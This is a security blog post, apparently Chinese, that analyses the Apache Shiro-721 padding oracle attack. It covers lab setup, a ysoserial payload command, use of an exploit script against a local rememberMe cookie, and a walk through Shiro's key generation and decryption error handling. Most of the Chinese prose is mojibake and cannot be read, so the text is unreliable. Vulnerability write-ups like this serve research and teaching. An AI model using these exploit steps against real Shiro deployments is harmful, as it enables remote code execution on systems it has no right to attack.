    <content type="html"><![CDATA[<h1 id="Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ"><a href="#Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ" class="headerlink" title="Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ"></a>Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ</h1><p>åœ¨ Shiro550 æ¼æ´ä¸­ï¼ŒCookie æ‰€ä½¿ç”¨çš„ AES åŠ å¯†å¯†é’¥ä¸ºç¡¬ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®å¹¶ä½¿ç”¨å›ºå®šçš„ AES å¯†é’¥è¿›è¡Œæ­£ç¡®åŠ å¯†æ¶æ„åºåˆ—å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿›è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ä½†åœ¨è¯¥æ¼æ´å…¬å¸ƒåï¼ŒShiro å®˜æ–¹ä¿®å¤äº†è¿™ä¸€æ¼æ´ï¼Œå°†AESå¯†é’¥ä¿®æ”¹æˆäº†åŠ¨æ€ç”Ÿæˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºæ¯ä¸€ä¸ª Cookieï¼Œéƒ½æ˜¯ä½¿ç”¨ä¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ è§£å¯†çš„ã€‚</p><p>Shiro-721æ¼æ´çš„äº§ç”Ÿæºè‡ªAES-128-CBCæ¨¡å¼ï¼Œå®ƒå—CBCå­—èŠ‚åè½¬æ”»å‡»å’ŒPadding Oracle Attack(ä¾§ä¿¡é“æ”»å‡»)çš„å½±å“ï¼Œå¯¼è‡´å¯ä»¥ä»ä¸€ä¸ªæ­£å¸¸çš„rememberMeçš„å€¼åŸºç¡€ä¸Š,æ ¹æ®Padding Oracle Attackçš„åŸç†,é€šè¿‡çˆ†ç ´æ„é€ å‡ºæ¶æ„çš„RememberMeï¼Œé‡æ–°å‘é€åˆ°æœåŠ¡å™¨ç«¯è¿›è¡Œè§£æå¹¶è§¦å‘ååºåˆ—åŒ–è¾¾åˆ°RCEçš„æ•ˆæœ</p><p>ä¸ªäººæ„Ÿè§‰æ¯”è¾ƒé¸¡è‚‹ï¼Œå› ä¸ºéœ€è¦ä¸€ä¸ªæ­£ç¡®çš„è´¦å·ï¼Œè¿™ä¸ªæ¡ä»¶å°±æ¯”è¾ƒè‹›åˆ»äº†ï¼Œå¦‚æœä½ æ˜¯ä¸€ä¸ªæ™®é€šè´¦å·ç™»å½•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯èƒ½è¿å‘½ä»¤æ‰§è¡Œçš„æƒé™éƒ½æ²¡æœ‰ï¼Œéƒ¨åˆ†æƒ…å†µæ˜¯è¿™æ ·çš„ï¼Œå¿…é¡»æ˜¯æœ‰æ‰§è¡Œæƒé™çš„è´¦æˆ·ä¾‹å¦‚rootè´¦æˆ·ï¼Œå…·ä½“è¦çœ‹å¼€å‘æ€ä¹ˆæ¥å…¥çš„Shiroï¼Œæ‰€ä»¥å°±æ¯”è¾ƒé¸¡è‚‹</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><h2 id="æ‰‹åŠ¨æ­å»º"><a href="#æ‰‹åŠ¨æ­å»º" class="headerlink" title="æ‰‹åŠ¨æ­å»º"></a>æ‰‹åŠ¨æ­å»º</h2><p>å¯ä»¥ç›´æ¥ç”¨Drunkbabyä½¬çš„ï¼š<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Apache/Shiro/shiro721">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Apache/Shiro/shiro721</a></p><p>å¦‚æœè¦è‡ªå·±æ­å»ºï¼Œä¹Ÿå¯ä»¥è·Ÿç€Drunkbabyä½¬çš„æ•™ç¨‹æ­å»ºï¼š<a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721ç¯å¢ƒæ­å»º</a></p><p>IDEAå¯¼å…¥æ–‡ä»¶ç„¶åé…ä¸€ä¸‹Tomcatç¯å¢ƒå°±å¥½äº†</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-13%20at%2020.10.52@2x.png" alt="CleanShot 2025-08-13 at 20.10.52@2x"></p><p>è®°å¾—è¿˜éœ€è¦æŠŠå†æŠŠ <code>WEB-INF\lib</code> åŠ å…¥ project structure ä¸­</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2022.02.38@2x.png" alt="CleanShot 2025-08-14 at 22.02.38@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2008.18.06@2x.png" alt="CleanShot 2025-08-14 at 08.18.06@2x"></p><h2 id="dockeræ­å»º"><a href="#dockeræ­å»º" class="headerlink" title="dockeræ­å»º"></a>dockeræ­å»º</h2><p>æ¨èä½¿ç”¨dockerï¼Œå› ä¸ºåŸºæœ¬ä¸ä¼šå‡ºé—®é¢˜</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> clone https://github.com/inspiringz/Shiro-<span class="hljs-number">721</span>.git<br><span class="hljs-attribute">cd</span> Shiro-<span class="hljs-number">721</span>/Docker<br><span class="hljs-attribute">docker</span> build -t shiro-<span class="hljs-number">721</span> .<br><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.52.08@2x.png" alt="CleanShot 2025-08-14 at 19.52.08@2x"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬æ˜¯ 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p><p><code>Apache Shiro Padding Oracle Attack</code> çš„æ¼æ´åˆ©ç”¨å¿…é¡»æ»¡è¶³å¦‚ä¸‹å‰ææ¡ä»¶ï¼š</p><ul><li>å¼€å¯ rememberMe åŠŸèƒ½ï¼›</li><li>rememberMe å€¼ä½¿ç”¨ AES-CBC æ¨¡å¼è§£å¯†ï¼›</li><li>èƒ½è·å–åˆ°æ­£å¸¸ Cookieï¼Œå³ç”¨æˆ·æ­£å¸¸ç™»å½•çš„ Cookie å€¼ï¼›</li><li>å¯†æ–‡å¯æ§ï¼›</li></ul><h2 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç›¸è¾ƒäº550çš„åˆ©ç”¨å°±ç›¸å¯¹è¾ƒä¸ºéº»çƒ¦äº†ï¼Œå› ä¸ºæ¶‰åŠåˆ°<code>Padding Oracle Attack</code>ç›¸å…³çš„å¤„ç†ä»¥åŠç»•è¿‡ï¼Œå¹¶ä¸”å…³äºå¯†é’¥çš„ç¢°æ’æ—¶é—´ä¹Ÿç›¸å¯¹è¾ƒé•¿ã€‚æµç¨‹ä¸º</p><ol><li>ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»Cookieä¸­è·å–åˆæ³•çš„RememberMeã€‚</li><li>ä½¿ç”¨RememberMe cookieä½œä¸ºPadding Oracle Attackçš„å‰ç¼€ã€‚</li><li>åŠ å¯† ysoserial çš„åºåˆ—åŒ– payloadï¼Œä»¥é€šè¿‡Padding Oracle Attackåˆ¶ä½œæ¶æ„RememberMeã€‚</li><li>é‡æ”¾æ¶æ„RememberMe cookieï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚</li></ol><p>è®¤è¯æˆåŠŸä¸ä¼šç”ŸæˆdeleteMeçš„cookieå­—æ®µï¼Œè®¤è¯å¤±è´¥åˆ™ä¼šè®¾ç½®</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-13%20at%2022.18.02@2x.png" alt="CleanShot 2025-08-13 at 22.18.02@2x"></p><p>ä½¿ç”¨Javaååºåˆ—åŒ–å·¥å…· ysoserial ç”Ÿæˆ Payload:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /tmp/success&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span>æ³¨æ„æ˜¯å¦æœ‰å†™å…¥æƒé™ï¼Œæˆ‘åœ¨ç”¨æœ¬åœ°ç¯å¢ƒæ—¶ç”¨è¿™ä¸ªpayloadæ‰§è¡Œå¤±è´¥å°±æ˜¯å› ä¸ºå†™å…¥æƒé™æœ‰é—®é¢˜<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<a href="https://github.com/3ndz/Shiro-721">GitHubçš„exp</a>æ¥è¿›è¡Œ Padding Oracle Attackï¼Œå®‰è£…è„šæœ¬ä¸éœ€è¦ <code>pip install paddingoracle</code>ï¼Œç›´æ¥å°† GitHub é¡¹ç›®çš„ <code>paddingoracle.py</code> æ”¾åˆ°åŒç›®å½•å³å¯ï¼š</p><p>é€šè¿‡ Padding Oracle Attack ç”Ÿæˆ Evil Rememberme cookie:</p><blockquote><p><strong>æ³¨æ„ï¼š</strong> æ­¤ exp çˆ†ç ´æ—¶é—´è¾ƒé•¿ï¼Œå»ºè®®ä½¿ç”¨ ysoserial ç”Ÿæˆè¾ƒçŸ­çš„ payload éªŒè¯ï¼ˆeg: ping ã€ touch &#x2F;tmp&#x2F;success, etcï¼‰ï¼Œçº¦ 1 ä¸ªå¤šå°æ—¶å¯ç”Ÿæˆæ­£ç¡®çš„ rememberme cookieï¼Œç”ŸæˆæˆåŠŸåå°†è‡ªåŠ¨åœæ­¢è¿è¡Œã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python shiro_exp.py<br>Usage: shiro_exp.py &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;<br>python shiro_exp.py http://localhost:8080/account Q/YOn1G64exr7g6SFC+au3ah4JaRPgPDdsYEC8q9C3k0TS+kHjd/qMAsQ6qKfwY6Jf9z5J/dgNSPLzhQK9ahkP5gAg9vN9J+nz4B7J/ZXY94joflm6fzjUlsYPerPCd/6lU4XyIlTCtDlDgoNffG3oQZnYCepezfX59d8IhcRpCnmyS2Iv1DblL/9Eqzqs5VrIBPN1ScnJCjbF0W1zKeIh/+VTJWnrkynSuq5KoVNQZs4Wx/tP4VEIDMrmNFDRoZWBP+CQaB7OjFo/bfBpbj87lMmvI7EqQFOU0EqOG8C1sampBci2A5KcT3qzklx7G97ArERch0edE+WU445yr9hD/tpLqjC2tqBuEwfBs3hr94EuvPvtR6GmL1xPnbwQvvN7S0B8AFCzWp9yBnrS2zwVi0MVAYG/K2Fs9Bvltr2s89Em+xT9OSpI3qBB19kWqrtE3I14O7cY05Ge9E5nYKBoAG/ci5V4w5AaFKN45GAqFjNVsHoZrzYr6frSXIxpsB payload.bin<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.48.58@2x.png" alt="CleanShot 2025-08-14 at 19.48.58@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.50.33@2x.png" alt="CleanShot 2025-08-14 at 19.50.33@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2019.48.12@2x.png" alt="CleanShot 2025-08-14 at 19.48.12@2x"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥å·¥å…·æ¢­å“ˆï¼Œå·¥å…·å°±å¤ªå¤šäº†</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="Padding-Oracle-Attack-æ„é€ åŠ å¯†æ•°æ®åˆ†æ"><a href="#Padding-Oracle-Attack-æ„é€ åŠ å¯†æ•°æ®åˆ†æ" class="headerlink" title="Padding Oracle Attack æ„é€ åŠ å¯†æ•°æ®åˆ†æ"></a>Padding Oracle Attack æ„é€ åŠ å¯†æ•°æ®åˆ†æ</h2><p>å¯†ç è¿™ä¸€å—æˆ‘å°±çœŸçš„ä¸çŸ¥è€…æ…è¨€äº†ï¼Œå¯ä»¥å»ç½‘ä¸Šæ‰¾æ‰¾ç›¸å…³èµ„æ–™ï¼Œè¿˜æ˜¯è›®è¯¦ç»†çš„</p><p>ç½‘ä¸Šè®²çš„æ–‡ç« å¤§å¤šæ•°éƒ½æ˜¯è®²çš„å¦‚ä½•ä½¿ç”¨ Padding Oracle Attack æ¥è·å–æ˜æ–‡ã€‚ä½†æ˜¯è¿™ç§åœºæ™¯åœ¨ Apache Shiro Padding Oracle Attack è¿™ä¸ªæ¼æ´åœºæ™¯ä¸­å°±ä¸é€‚ç”¨äº†ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ æ¶æ„åŠ å¯†æ•°æ®ï¼Œè¿›è¡Œè§£å¯†åååºåˆ—åŒ–ã€‚</p><p>æ­¤å¤„å†…å®¹å‚è€ƒè‡ª <a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89</a></p><p>è¿™é‡Œç®€å•è¯´ä¸‹ Padding Oracle Attack åŠ å¯†æ•°æ®æ•´ä½“è¿‡ç¨‹ï¼š</p><ol><li>é€‰æ‹©ä¸€ä¸ªæ˜æ–‡ <code>P</code>ï¼Œç”¨æ¥ç”Ÿæˆä½ æƒ³è¦çš„å¯†æ–‡<code>C</code>ï¼›</li><li>ä½¿ç”¨é€‚å½“çš„ Padding å°†å­—ç¬¦ä¸²å¡«å……ä¸ºå—å¤§å°çš„å€æ•°ï¼Œç„¶åå°†å…¶æ‹†åˆ†ä¸ºä» 1 åˆ° N çš„å—ï¼›</li><li>ç”Ÿæˆä¸€ä¸ªéšæœºæ•°æ®å—ï¼ˆ<code>C[n]</code> è¡¨ç¤ºæœ€åä¸€ä¸ªå¯†æ–‡å—ï¼‰ï¼›</li><li>å¯¹äºæ¯ä¸€ä¸ªæ˜æ–‡å—ï¼Œä»æœ€åä¸€å—å¼€å§‹ï¼š<ol><li>åˆ›å»ºä¸€ä¸ªåŒ…æ‹¬ä¸¤å—çš„å¯†æ–‡Câ€™ï¼Œå…¶æ˜¯é€šè¿‡ä¸€ä¸ªç©ºå—ï¼ˆ00000â€¦ï¼‰ä¸æœ€è¿‘ç”Ÿæˆçš„å¯†æ–‡å—<code>C[n+1]</code>ï¼ˆå¦‚æœæ˜¯ç¬¬ä¸€è½®åˆ™æ˜¯éšæœºå—ï¼‰ç»„åˆæˆçš„ï¼›</li><li>è¿™æ­¥å®¹æ˜“ç†è§£ï¼Œå°±æ˜¯Padding Oracleçš„åŸºæœ¬æ”»å‡»åŸç†ï¼šä¿®æ”¹ç©ºå—çš„æœ€åä¸€ä¸ªå­—èŠ‚ç›´è‡³Padding Oracleæ²¡æœ‰å‡ºç°é”™è¯¯ä¸ºæ­¢ï¼Œç„¶åç»§ç»­å°†æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º2å¹¶ä¿®æ”¹æœ€åç¬¬äºŒä¸ªå­—èŠ‚ç›´è‡³Padding Oracleæ²¡æœ‰å‡ºç°é”™è¯¯ä¸ºæ­¢ï¼Œä¾æ¬¡ç±»æ¨ï¼Œç»§ç»­è®¡ç®—å‡ºå€’æ•°ç¬¬3ã€4â€¦ä¸ªç›´è‡³æœ€åä¸€ä¸ªæ•°æ®ä¸ºæ­¢ï¼›</li><li>åœ¨è®¡ç®—å®Œæ•´ä¸ªå—ä¹‹åï¼Œå°†å®ƒä¸æ˜æ–‡å— <code>P[n]</code> è¿›è¡ŒXORä¸€èµ·åˆ›å»º <code>C[n]</code>ï¼›</li><li>å¯¹åç»­çš„æ¯ä¸ªå—é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼ˆåœ¨æ–°çš„å¯†æ–‡å—å‰æ·»åŠ ä¸€ä¸ªç©ºå—ï¼Œç„¶åè¿›è¡ŒPadding Oracleçˆ†ç ´è®¡ç®—ï¼‰ï¼›</li></ol></li></ol><p>ç®€å•åœ°è¯´ï¼Œæ¯ä¸€ä¸ªå¯†æ–‡å—è§£å¯†ä¸ºä¸€ä¸ªæœªçŸ¥å€¼ï¼Œç„¶åä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡ŒXORã€‚é€šè¿‡ä»”ç»†é€‰æ‹©å‰ä¸€ä¸ªå—ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸‹ä¸€ä¸ªå—è§£å¯†æ¥å¾—åˆ°ä»€ä¹ˆã€‚å³ä½¿ä¸‹ä¸€ä¸ªå—è§£å¯†ä¸ºä¸€å †æ— ç”¨æ•°æ®ï¼Œä½†ä»ç„¶èƒ½è¢«XORåŒ–ä¸ºæˆ‘ä»¬æ§åˆ¶çš„å€¼ï¼Œå› æ­¤å¯ä»¥è®¾ç½®ä¸ºä»»ä½•æˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚</p><h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><h3 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h3><p>åœ¨ Shiro550 ä¸­ï¼Œå¯†é’¥æ˜¯ç¡¬ç¼–ç ï¼Œå°±åƒä¸‹é¢è¿™æ ·</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.33.01@2x.png"></p><p>è€Œåœ¨Shiro721ä¸­ï¼Œç¡¬ç¼–ç å–æ¶ˆäº†è€Œæ˜¯æ”¹ä¸ºåŠ¨æ€ç”Ÿæˆï¼Œå¦‚å›¾ä»£ç </p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2021.48.51@2x.png" alt="CleanShot 2025-08-14 at 21.48.51@2x"></p><p>æ ¹æ®ä¸Šå›¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œæ‰¾åˆ°<code>generateNewKey</code>è¿™ä¸ªå…³é”®æ–¹æ³•çš„æ‰€åœ¨åœ°æ–¹ï¼Œå®šä½åˆ°<code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2010.50.54@2x.png" alt="CleanShot 2025-08-15 at 10.50.54@2x"></p><blockquote><p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ç”Ÿæˆä¸€ä¸ªæ–°çš„åŠ å¯†å¯†é’¥ï¼š<br>é€šè¿‡KeyGenerator.getInstance()è·å–æŒ‡å®šç®—æ³•çš„å¯†é’¥ç”Ÿæˆå™¨å®ä¾‹<br>å¦‚æœç®—æ³•ä¸å­˜åœ¨åˆ™æŠ›å‡ºå¼‚å¸¸<br>åˆå§‹åŒ–å¯†é’¥ç”Ÿæˆå™¨çš„å¯†é’¥é•¿åº¦<br>ç”Ÿæˆå¹¶è¿”å›æ–°çš„å¯†é’¥<br>æ ¸å¿ƒä½œç”¨æ˜¯æ ¹æ®æŒ‡å®šçš„ç®—æ³•åç§°å’Œå¯†é’¥ä½æ•°åˆ›å»ºå¯¹åº”çš„åŠ å¯†å¯†é’¥ã€‚</p></blockquote><p>åˆå§‹åŒ–äº†ä¸€ä¸ª<code>KeyGenerator</code>å¯¹è±¡å¹¶è°ƒç”¨<code>init()</code>æ–¹æ³•åˆå§‹åŒ–å…¶å‚æ•°ï¼Œè·Ÿè¿›çœ‹çœ‹å‚æ•°æ˜¯æ€ä¹ˆè¢«èµ‹å€¼çš„</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.00.43@2x.png" alt="CleanShot 2025-08-15 at 11.00.43@2x"></p><p>è·å–äº†ä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå™¨SecureRandomï¼Œç»§ç»­è·Ÿè¿›init()</p><p>å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œ mySpi æ˜¯ <code>AESKeyGenerator</code>ï¼Œè·Ÿè¿› <code>engineInit()</code> æ–¹æ³•ï¼Œè¿›è¡Œäº† AES ç®—æ³•çš„åˆå§‹åŒ–ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.06.20@2x.png" alt="CleanShot 2025-08-15 at 11.06.20@2x"></p><blockquote><p>engineInit()æ–¹æ³•ä½œç”¨å¦‚ä¸‹ï¼š</p><p>éªŒè¯å¯†é’¥é•¿åº¦æ˜¯å¦ä¸º8çš„å€æ•°ä¸”åœ¨æœ‰æ•ˆèŒƒå›´å†…ï¼ˆ128&#x2F;192&#x2F;256ä½ï¼‰<br>å°†ä¼ å…¥çš„å¯†é’¥é•¿åº¦ï¼ˆbitï¼‰è½¬æ¢ä¸ºå­—èŠ‚å•ä½å­˜å‚¨<br>è°ƒç”¨å¦ä¸€ä¸ªåˆå§‹åŒ–æ–¹æ³•è®¾ç½®éšæœºæ•°ç”Ÿæˆå™¨<br>å¦‚æœå¯†é’¥é•¿åº¦ä¸ç¬¦åˆè¦æ±‚åˆ™æŠ›å‡ºå‚æ•°å¼‚å¸¸ã€‚</p></blockquote><p>å›åˆ° <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code>ï¼Œè·Ÿè¿› <code>generateKey()</code> æ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.08.31@2x.png" alt="CleanShot 2025-08-15 at 11.08.31@2x"></p><p>åœ¨ <code>com.sun.crypto.provider.AESKeyGenerator#engineGenerateKey()</code> æ–¹æ³•ä¹Ÿä¸‹ä¸ªæ–­ç‚¹ï¼Œä¸ç„¶ä¸ä¼šåœåœ¨è¿™é‡Œã€‚</p><p>è·Ÿè¿›åˆ°æœ€åå¯è§è¿™é‡Œå·²ç»ç”Ÿæˆäº†ä¸€ä¸²16å­—èŠ‚çš„éšæœºåºåˆ—ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ª <code>SecretKeySpec</code> å¯¹è±¡ï¼Œå†ä½¿ç”¨<code>getEncoded()</code> æ–¹æ³•è·å– <code>key</code> å¯†é’¥åºåˆ—ã€‚</p><blockquote><p>å…³äºè¿™æ®µéšæœºåºåˆ—çš„å½¢æˆè¿‡ç¨‹ï¼Œåœ¨ä¸äºjava.security.SecureRandom#nextBytes(byte[])å’Œjava.util.Arrays#fill(byte[], byte)ï¼Œä¸è¿‡å¹¶ä¸é‡è¦ï¼Œåªæ˜¯ä¸€äº›ç®€å•çš„å½¢æˆ</p></blockquote><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.20.02@2x.png" alt="CleanShot 2025-08-15 at 11.20.02@2x"></p><p>è‡³æ­¤å°±æ˜¯ Shiro721 å®Œæ•´çš„å¯†é’¥ç”Ÿæˆè¿‡ç¨‹ã€‚</p><h3 id="åœ¨-shiro721-ä¸­çš„Padding-Oracle-Attack"><a href="#åœ¨-shiro721-ä¸­çš„Padding-Oracle-Attack" class="headerlink" title="åœ¨ shiro721 ä¸­çš„Padding Oracle Attack"></a>åœ¨ shiro721 ä¸­çš„Padding Oracle Attack</h3><p>è¦æˆåŠŸè¿›è¡Œ Padding Oracle Attack æ˜¯éœ€è¦æœåŠ¡ç«¯è¿”å›ä¸¤ä¸ªä¸åŒçš„å“åº”ç‰¹å¾æ¥è¿›è¡Œ Bool åˆ¤æ–­çš„ã€‚</p><p>åœ¨ Apache Shiro çš„åœºæ™¯ä¸­ï¼Œè¿™ä¸ªæœåŠ¡ç«¯çš„ä¸¤ä¸ªä¸åŒçš„å“åº”ç‰¹å¾ä¸ºï¼š</p><ul><li>Padding Oracle é”™è¯¯æ—¶ï¼ŒæœåŠ¡ç«¯å“åº”æŠ¥æ–‡çš„ Set-Cookie å¤´å­—æ®µè¿”å› <code>rememberMe=deleteMe</code>ï¼›</li><li>Padding Oracle æ­£ç¡®æ—¶ï¼ŒæœåŠ¡ç«¯è¿”å›æ­£å¸¸çš„å“åº”æŠ¥æ–‡å†…å®¹ï¼›</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å“åº”å¤´æ¥åˆ¤æ–­æ˜æ–‡å¡«å……æ˜¯å¦æ­£ç¡®ï¼Œè¿›è€Œçˆ†ç ´å‡ºä¸­é—´å€¼ã€‚é‚£ä¹ˆå¯¹äºè§£å¯†ä¸æ­£ç¡®çš„ Cookieï¼ŒShiro æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿ</p><h4 id="0x01-Padding-Oracleé”™è¯¯å¤„ç†"><a href="#0x01-Padding-Oracleé”™è¯¯å¤„ç†" class="headerlink" title="0x01 Padding Oracleé”™è¯¯å¤„ç†"></a>0x01 Padding Oracleé”™è¯¯å¤„ç†</h4><p>è·Ÿ550ä¸€æ ·å»æ‰¾è§£å¯†å‡½æ•°ï¼Œåœ¨ <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code> ä¸­</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.08.02@2x.png" alt="CleanShot 2025-08-15 at 13.08.02@2x"></p><p>è·Ÿè¿›å…³é”®æ–¹æ³•<code>cipherService.decrypt()</code>ï¼Œæœ€ååˆ°<code>crypt()</code>ä¸­è°ƒç”¨<code>doFinal()</code>æ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.13.39@2x.png" alt="CleanShot 2025-08-15 at 13.13.39@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.15.15@2x.png" alt="CleanShot 2025-08-15 at 13.15.15@2x"></p><p>çœ‹ä¸€ä¸‹<code>doFinal()</code>æ–¹æ³•å®ç°çš„åŠŸèƒ½ï¼Œæ³¨é‡Šå·²ç»å†™çš„å¾ˆæ¸…æ¥šäº†</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.19.33@2x.png" alt="CleanShot 2025-08-15 at 13.19.33@2x"></p><p><code>doFinal()</code>æ–¹æ³•æœ‰<code>IllegalBlockSizeException</code>å’Œ<code>BadPaddingException</code>è¿™ä¸¤ä¸ªå¼‚å¸¸ï¼Œåˆ†åˆ«ç”¨äºæ•è·å—å¤§å°å¼‚å¸¸å’Œå¡«å……é”™è¯¯å¼‚å¸¸ã€‚å¼‚å¸¸ä¼šè¢«æŠ›å‡ºåˆ°<code>crypt()</code>æ–¹æ³•ä¸­ï¼Œæœ€ç»ˆè¢«<code>getRememberedPrincipals()</code>æ–¹æ³•æ•è·ï¼Œå¹¶æ‰§è¡Œ<code>onRememberedPrincipalFailure()</code>æ–¹æ³•ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.25.16@2x.png" alt="CleanShot 2025-08-15 at 14.25.16@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.31.05@2x.png" alt="CleanShot 2025-08-15 at 14.31.05@2x"></p><p><code>onRememberedPrincipalFailure()</code>æ–¹æ³•è°ƒç”¨äº†<code>forgetIdentity()</code>ã€‚åœ¨Shiro550ä¸­æˆ‘ä»¬åˆ†æè¿‡ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨<code>removeFrom()</code>ï¼Œåœ¨responseå¤´éƒ¨æ·»åŠ å­—æ®µ<code>Set-Cookie: rememberMe=deleteMe</code>ã€‚</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.35.08@2x.png" alt="CleanShot 2025-08-15 at 14.35.08@2x"></p><p><img 